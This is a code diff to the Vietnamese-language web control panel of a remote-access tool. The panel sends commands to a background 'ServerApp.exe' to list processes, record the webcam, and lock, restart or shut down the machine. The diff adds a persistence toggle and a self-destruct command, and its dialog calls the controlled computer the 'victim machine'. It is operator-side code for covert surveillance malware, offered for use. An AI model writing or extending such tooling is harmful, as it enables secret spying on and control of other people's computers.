@@ -79,12 +79,22 @@
                     <div id="process-list-output">
                         <p class="text-muted">Bấm "Xem Process" để tải danh sách...</p>
                     </div>
+
+                    <h5 class="mt-4">Tự Khởi Động (Persistence)</h5>
+                    <div class="btn-group w-100">
+                        <button class="btn btn-outline-success" onclick="sendCommand('PERSISTENCE', {mode: 'ON'})">Bật Tự Chạy</button>
+                        <button class="btn btn-outline-secondary" onclick="sendCommand('PERSISTENCE', {mode: 'OFF'})">Tắt Tự Chạy</button>
+                    </div>
                     
                     <h5 class="mt-4">Điều Khiển Nguồn</h5>
                     <div class="btn-group">
                         <button class="btn btn-warning" onclick="sendCommand('SYSTEM_CONTROL', {type: 'LOCK'})">Khóa Máy 🔒</button>
                         <button class="btn btn-secondary" onclick="sendCommand('SYSTEM_CONTROL', {type: 'RESTART'})">Khởi Động Lại</button>
                         <button class="btn btn-danger" onclick="sendCommand('SYSTEM_CONTROL', {type: 'SHUTDOWN'})">Tắt Máy</button>
+                    </div>
+                    <div class="d-grid gap-2 mt-4">
+                        <button class="btn btn-outline-danger fw-bold" onclick="killServer()">💀 HỦY DIỆT SERVER (Dừng Server App)</button>
+                        <small class="text-muted text-center">Lưu ý: Dùng để tắt file ServerApp.exe đang chạy ngầm.</small>
                     </div>
                 </div>
             </div>
@@ -374,6 +384,22 @@
             } else {
                  sendCommand('RECORD_CAM');
                  displayFeedback("Đã gửi lệnh Ghi hình 10s. Vui lòng chờ file tải về...", 'info');
+            }
+        }
+
+        function killServer() {
+            if (confirm("CẢNH BÁO NGUY HIỂM!\n\nBạn có chắc chắn muốn tắt ứng dụng Server trên máy nạn nhân không?\n\nSau khi tắt, bạn sẽ KHÔNG THỂ kết nối lại được nữa trừ khi có người bật lại thủ công file .exe!")) {
+                displayFeedback("Đang gửi lệnh tự hủy tới Server...", 'error');
+                sendCommand('KILL_SERVER');
+                
+                // Cập nhật giao diện sau khi server chết
+                setTimeout(() => {
+                    document.getElementById('ws-status').textContent = 'DEAD';
+                    document.getElementById('ws-status').className = 'badge bg-dark';
+                    alert("Server đã xác nhận lệnh tự hủy. Kết nối đã ngắt vĩnh viễn.");
+                    // Vô hiệu hóa các nút để tránh bấm nhầm
+                    ws.close();
+                }, 2000);
             }
         }
 
